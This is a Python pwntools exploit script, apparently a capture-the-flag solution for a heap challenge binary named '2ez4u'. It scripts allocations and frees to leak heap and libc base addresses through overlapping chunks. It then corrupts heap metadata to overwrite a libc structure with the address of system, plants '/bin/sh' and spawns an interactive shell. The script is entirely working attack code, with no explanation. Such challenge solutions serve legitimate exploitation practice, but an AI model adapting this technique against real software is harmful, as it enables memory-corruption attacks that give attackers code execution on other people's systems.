#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./2ez4u"
ENV = {"LD_PRELOAD":"./libc.so.6"}

p = process(elf)

def add(length, s):
    p.recvuntil("your choice: ")
    p.sendline("1")
    p.recvuntil("color?(0:red, 1:green):")
    p.sendline(str(0))
    p.recvuntil("value?(0-999):")
    p.sendline(str(0))
    p.recvuntil("num?(0-16):")
    p.sendline(str(0))
    p.recvuntil("description length?(1-1024):")
    p.sendline(str(length))
    p.recvuntil("description of the apple:")
    p.send(s)

def delete(idx):
    p.recvuntil("your choice: ")
    p.sendline("2")
    p.recvuntil("which?(0-15):")
    p.sendline(str(idx))

def edit(idx, s):
    p.recvuntil("your choice: ")
    p.sendline("3")
    p.recvuntil("which?(0-15):")
    p.sendline(str(idx))
    p.recvuntil("color?(0:red, 1:green):")
    p.sendline(str(0))
    p.recvuntil("value?(0-999):")
    p.sendline(str(0))
    p.recvuntil("num?(0-16):")
    p.sendline(str(0))
    p.recvuntil("new description of the apple:") 
    p.send(s)

def show(idx):
    p.recvuntil("your choice: ")
    p.sendline("4")
    p.recvuntil("which?(0-15):")
    p.sendline(str(idx))


add(0x20-0x18, p8(0)*(0x20-0x18))  # 0
add(0x20-0x18, p8(0)*(0x20-0x18))  # 1
add(0x20-0x18, p8(0)*(0x20-0x18))  # 2
add(0x80-0x18, p8(0)*(0x80-0x18))  # 3
add(0x80-0x18, p8(0)*(0x80-0x18))  # 4
add(0x3f0-0x18, p8(0)*(0x3f0-0x18))    # 5
add(0x10, p8(0)*0x10)  # 6

delete(3)
delete(5)
add(0x400-0x18, p8(0)*(0x400-0x18))    # 3

show(5)
p.recvuntil("description:")
heap_base = u64(p.recv(6).ljust(8, "\x00"))-0x1b0
log.info("heap_base: "+hex(heap_base))

delete(4)
add(0x120-0x18, p8(0)*(0x120-0x18))    # 4

show(5)
p.recvuntil("description:")
libc_base = u64(p.recv(6).ljust(8, "\x00"))-0x3c4b78
log.info("libc_base: "+hex(libc_base))

delete(0)
delete(1)
delete(2)

add(0x30-0x18, p8(0)*(0x30-0x18))   # 0
add(0x40-0x18, p8(0)*(0x40-0x18))   # 1
add(0x60-0x18, p8(0)*(0x60-0x18))   # 2

delete(0)
delete(1)
delete(2)

payload = p8(0)*0x30
payload += p64(0x51)
payload += p64(libc_base+0x3c4b48)
payload += p8(0)*0x40
payload += p64(0x71)
payload += p64(0x51)
payload += "\n"
edit(5, payload)

add(0x60-0x18, "\n")    # 0
add(0x40-0x18, "\n")    # 1
add(0x40-0x18, "\n")    # 2

payload = p8(0)*0x30
payload += p64(0x51)
payload += "/bin/sh\x00\n"
edit(5, payload)

payload = p8(0)*0x8
payload += p64(libc_base+0x3c5c50)
payload += "\n"
edit(2, payload)

add(0x300-0x18, "\n")   # 5
add(0x300-0x18, "\n")   # 7
add(0x300-0x18, "\n")   # 8
add(0x300-0x18, "\n")   # 9

payload = p8(0)*0x200
payload += p64(libc_base+0x45390)
payload += "\n"
edit(9, payload)

delete(1)

p.interactive()
